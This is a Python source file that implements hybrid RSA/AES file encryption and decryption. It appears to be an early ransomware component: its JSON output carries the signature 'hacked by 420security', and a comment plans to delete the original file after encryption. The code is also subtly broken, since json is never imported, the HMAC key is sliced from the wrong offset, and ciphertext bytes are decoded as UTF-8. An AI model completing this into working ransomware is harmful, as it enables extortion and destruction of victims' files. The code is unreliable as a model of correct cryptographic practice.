from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding 
from cryptography.hazmat.primitives import hashes, hmac
import os
import constants
import AES_Encrypt as a

def GenerateRSAKeys():
    #
    #
    #
    
    exp = constants.RSA_EXPONENT
    key_len = constants.RSA_KEYSIZE
    private_key = rsa.generate_private_key(exp,key_len, backend = default_backend())
    public_key = private_key.public_key()
    #WritePrivateKey(filepath,private_key)
    #WritePublicKey(filepath,public_key)
    WritePrivateKey(constants.RSA_PRIVATE_KEY_PATH, private_key)
    WritePublicKey(constants.RSA_PUBLIC_KEY_PATH, public_key)



def WritePrivateKey(filepath,key):
    #
    #
    #
    private_key = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption())
    file = open(constants.RSA_PRIVATE_KEY_PATH ,'wb')
    file.write(private_key)
    file.close()
    


def WritePublicKey(filepath, key):
    #
    #
    #
    public_key = key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)
    
    file = open(constants.RSA_PUBLIC_KEY_PATH ,'wb')
    file.write(public_key)
    file.close()
            


def LoadRSAPrivateKey(filepath):
    #
    #
    #

    private_key = ""
    with open(filepath,"rb") as file:
        private_key = serialization.load_pem_private_key(
            file.read(),
            password = None,
            backend = default_backend()
        )
    return private_key


def LoadRSAPublicKey(filepath):
    #
    #
    #

    public_key = ""
    with open(filepath,"rb") as file:
        public_key = serialization.load_pem_public_key(
            file.read(),
            backend = default_backend())
    return public_key


def check_keys():
    if (not os.path.isfile(constants.RSA_PRIVATE_KEY_PATH)) or (not os.path.isfile(constants.RSA_PUBLIC_KEY_PATH)):
        GenerateRSAKeys()
    # generates keys if keys are not found
    return 


def MyRSAFileEncrypt(filepath):
    #
    #
    #

    check_keys()
    C, IV, tag, EncKey, HMACKey, fileName, ext = a.MyFileEncrypt(filepath)
    public_key = LoadRSAPublicKey(constants.RSA_PUBLIC_KEY_PATH)
    key = EncKey + HMACKey
    RSACipher = public_key.encrypt(
        key,
        padding.OAEP(
            mgf = padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    #writeToJSON(RSACipher, C, IV, tag, fileName, ext)
    # TODO: DELETE ORIGINAL FILE
    return RSACipher, C, IV, tag, fileName, ext


def MyRSAFileDecrypt(filepath, RSACipher, C, IV, tag, fileName, ext):
    #(filepath, RSACipher, C, IV, tag, fileName, ext)
    #
    #

    private_key = LoadRSAPrivateKey(constants.RSA_PRIVATE_KEY_PATH)
    keys = private_key.decrypt(
        RSACipher,
        padding.OAEP(
            mgf= padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    EncKey = keys[:constants.KEY_LEN]
    HMACKey = keys[constants.HMAC_KEY_LEN:]
    # GETTING INFO FROM JSON 
    #fileName = a.fileInfo(filepath)[0]
    #RSACipher, C, IV, tag, ext = readFromJSON(fileName) # getting values with file name
    filepath, plaintext = a.MyFileDecrypt(filepath, C, IV, tag, EncKey, HMACKey, ext)

    #makeFile(plaintext, fileName)  # creates original decrypted file
    return plaintext, fileName


def writeToJSON(RSACipher, C, IV, tag, fileName, ext):
    """
    Writes values to a json file
    INPUT: RSACipher, C, IV, tag, fileName, ext
    """
    data = {}
    data["signature"] = "hacked by 420security"
    data["RSACipher"] = RSACipher.decode("utf-8")
    data["C"] = C.decode("utf-8")
    data["IV"] = IV.decode("utf-8")
    data["tag"] = tag.decode("utf-8")
    data["ext"] = ext
    newName = fileName + ".json"

    s = json.dumps(data)
    with open(newName, "w") as fp:
        json.dump(s, fp)


def readFromJSON(fileName):
    """
    Returns values stored in JSON file
    INPUT:  fileName - (str) name of file
    OUTPUT:  (RSACipher, C, IV, tag, ext)
    TODO: test byte conversion with 'b'
    """
    with open(fileName) as json_file:  
        data = json.load(json_file)

    RSACipher = bytes(data["RSACipher"], "utf-8")
    C = bytes(data["C"], "utf-8")
    IV = bytes(data["IV"], "utf-8")
    tag = bytes(data["tag"], "utf-8")
    ext = data["ext"]
    
    return RSACipher, C, IV, tag, ext


def makeFile(m, fileName):
    """
    Creates a file given the decrypted plaintext m
    INPUT:  m - (byte str) plaintext
            fileName -  (str) name of file with extension 
    """
    out_file = open(fileName, "wb") # writing decrypted message to file
    out_file.write(m)
    out_file.close()
    return


def main():
    print("TESTING WITH FILE TEXT FILE\n\n")
    filepath = "test-files/test.txt"
    RSACipher, C, IV, tag, fileName, ext = MyRSAFileEncrypt(filepath)

    #message = MyRSAFileDecrypt(filepath)
    message = MyRSAFileDecrypt(filepath, RSACipher, C, IV, tag, fileName, ext)
    print(message)


main()


